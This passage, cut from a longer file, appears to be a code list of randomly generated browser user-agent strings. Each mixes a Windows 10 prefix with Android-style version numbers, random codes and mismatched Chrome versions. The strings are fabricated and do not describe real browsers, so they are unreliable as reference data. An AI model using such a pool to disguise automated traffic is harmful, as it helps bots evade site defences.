x64)E600A) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4399.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y690D) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4855.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N299D) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4441.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)R126Q) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4262.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G832L) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4548.45 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q308D) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4716.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D439L) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4418.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L793Q) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4706.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L532K) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4582.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)O964Q) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4260.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)I438E) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4866.58 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)V295O) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4499.99 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K553M) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4249.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)D121I) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4401.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Q798S) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4558.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)A861T) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4503.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D145A) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4530.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T28W) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4465.150 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E690E) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4305.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H315T) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4354.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Q902G) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4378.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K152G) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4217.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)G194N) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4879.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)V466R) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4264.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D586Y) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4400.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)V335U) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4489.120 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H415Z) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4857.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Y266F) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4686.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)L134C) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4286.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P224L) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4430.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)M888C) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4860.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A778E) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4580.124 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)R354Q) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4419.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)V767C) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4863.58 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W166R) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4812.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)L378D) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4682.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O132G) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4237.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)E369E) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4594.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P474J) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4478.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)X394L) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4873.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)D72L) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4267.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C321Y) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4599.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)O80A) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4698.119 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y560O) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4428.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)E421G) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4562.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)M738G) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4616.111 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Y948U) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4865.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C877P) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4825.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)W945W) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4629.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)R338A) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4512.77 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P75D) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4662.82 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Z230G) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4537.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)A835N) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4797.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F508D) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4517.77 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)B622F) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4481.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)P589A) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4840.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)H129B) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4884.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Q43X) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4796.41 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)L465C) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4267.81 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J701S) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4821.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)K176A) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4553.48 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y675O) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4396.66 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C288W) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4410.79 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N179I) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4698.119 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B137T) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4519.150 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Q84N) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4628.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N7T) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4613.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)C590A) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4732.117 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K773E) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4505.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)H177S) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4330.50 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)T740N) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4666.143 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E438R) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4694.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O200D) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4507.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)H767R) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4793.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)B722B) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4213.88 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)O692L) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4271.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)O787G) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4272.115 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)G520N) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4421.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)V87C) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4306.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N146J) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4477.97 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E770B) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4429.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)M481Z) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4651.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)C270J) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4254.143 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G134J) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4278.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)B847P) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4465.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)E83N) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4527.65 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T173O) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4634.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N352S) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4755.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L644E) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4476.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q58B) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4576.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)C558Q) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4347.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G332U) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4378.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)I851P) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4613.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z477Q) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4863.75 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M151Y) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4658.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C599U) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4638.59 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A178W) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4399.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P241A) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4823.90 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N642X) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4415.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)K986U) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4316.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y228Y) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4491.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H934U) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4731.77 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A210X) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4523.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)O719G) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4466.80 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A713D) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4530.111 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)I225N) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4817.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A710B) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4586.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)J704V) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4236.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A935C) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4435.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L113X) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4839.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y52Q) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4856.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H631D) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4344.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)P511I) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4706.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)P593P) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4418.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)B580K) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4481.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Q535C) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4328.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A545R) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4686.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A628M) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4379.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Z852C) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4710.115 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)X3O) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4554.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)P562H) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4504.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)V497P) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4296.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A324Y) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4662.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H561A) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4624.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)B131P) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4230.102 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)U988Q) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4675.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G143N) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4677.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)M741U) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4551.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)C7W) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4537.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C843X) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4432.105 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)O135E) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4677.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J144G) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4231.59 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Q348A) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4750.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)U452K) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4740.145 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q735T) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4718.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Z587Z) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4349.111 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)D993U) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4303.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H347V) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4786.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G127K) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4608.55 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)E820D) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4383.122 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)R901M) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4625.88 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L49B) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4721.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)X816J) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4801.88 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A139W) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4850.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H230Y) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4786.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y792M) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4762.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K20D) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4544.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)V195O) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4863.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F989I) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4268.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)R932Y) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4208.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A331R) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4322.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G943F) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4877.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z77Y) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4623.84 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)F690Q) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4668.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A325M) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4331.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A163W) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4559.99 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A989A) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4809.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)I202A) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4606.45 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N401W) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4371.71 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)W384S) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4559.60 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J417F) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4415.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)R271G) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4669.86 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)U487J) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4789.133 Chrome/105.0.0.0 Safari/537.36', 